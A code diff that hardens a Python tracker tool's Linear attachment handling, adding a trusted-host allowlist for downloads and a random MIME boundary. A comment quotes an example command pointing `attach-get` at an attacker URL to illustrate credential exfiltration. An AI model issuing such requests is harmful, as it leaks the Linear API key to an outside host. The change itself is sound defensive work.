@@ -33,7 +33,21 @@ from ..wire import (
     parent_read,
 )
 
-BOUNDARY = "----flowctl-attach-boundary"
+#: Trusted origins for Linear asset retrieval - attach-get sends the LINEAR
+#: API KEY with the request, so an arbitrary URL is a credential-exfiltration
+#: primitive (`wire attach-get https://attacker/...`). Measured assetUrl host:
+#: uploads.linear.app.
+_LINEAR_ASSET_HOSTS = ("uploads.linear.app", "files.linear.app")
+
+
+def _random_boundary(payload: bytes) -> str:
+    """A fixed boundary can collide with binary payload bytes at a MIME line
+    boundary (truncation/rejection). Generate one absent from the payload."""
+    import secrets  # noqa: PLC0415
+    while True:
+        candidate = f"----flowctl-{secrets.token_hex(16)}"
+        if candidate.encode() not in payload:
+            return candidate
 
 
 def _sha(data: bytes) -> str:
@@ -54,19 +68,20 @@ def _as_error(provider: str, result: Union[Response, TrackerError]
 def _multipart(filename: str, data: bytes, *, field: str = "file",
                content_type: Optional[str] = None) -> tuple[bytes, str]:
     ctype = content_type or mimetypes.guess_type(filename)[0] or "application/octet-stream"
+    boundary = _random_boundary(data)
     # Keep filename ASCII-safe for the disposition header.
     safe = filename.replace('"', "_").replace("\r", "").replace("\n", "")
     parts = [
-        f"--{BOUNDARY}\r\n".encode(),
+        f"--{boundary}\r\n".encode(),
         (f'Content-Disposition: form-data; name="{field}"; '
          f'filename="{safe}"\r\n').encode(),
         f"Content-Type: {ctype}\r\n\r\n".encode(),
         data,
         b"\r\n",
-        f"--{BOUNDARY}--\r\n".encode(),
+        f"--{boundary}--\r\n".encode(),
     ]
     body = b"".join(parts)
-    return body, f"multipart/form-data; boundary={BOUNDARY}"
+    return body, f"multipart/form-data; boundary={boundary}"
 
 
 def _write_out(out_path: str, data: bytes) -> Optional[TrackerError]:
@@ -226,7 +241,17 @@ def _linear_upload(config: dict, locator: dict, execute: Execute, *,
 
 def _linear_download(config: dict, execute: Execute, *, attachment_id: str,
                      out_path: str) -> Result:
-    # attachment_id IS the assetUrl returned by upload.
+    # attachment_id IS the assetUrl returned by upload. The request carries the
+    # LINEAR API KEY, so the origin MUST be a trusted Linear asset host - an
+    # arbitrary URL here is a credential-exfiltration primitive.
+    from urllib.parse import urlparse  # noqa: PLC0415
+    parsed = urlparse(str(attachment_id))
+    if parsed.scheme != "https" or (parsed.hostname or "").lower() not in _LINEAR_ASSET_HOSTS:
+        return TrackerError(
+            ErrorClass.INVALID_INPUT,
+            f"linear attach-get only retrieves from trusted Linear asset hosts "
+            f"{_LINEAR_ASSET_HOSTS} over https; got {parsed.hostname!r}",
+            subtype="untrusted_origin")
     result = execute(Request(
         provider="linear", op="wire-attach-get", method="GET",
         url_or_argv=attachment_id, headers={"Accept": "*/*"},
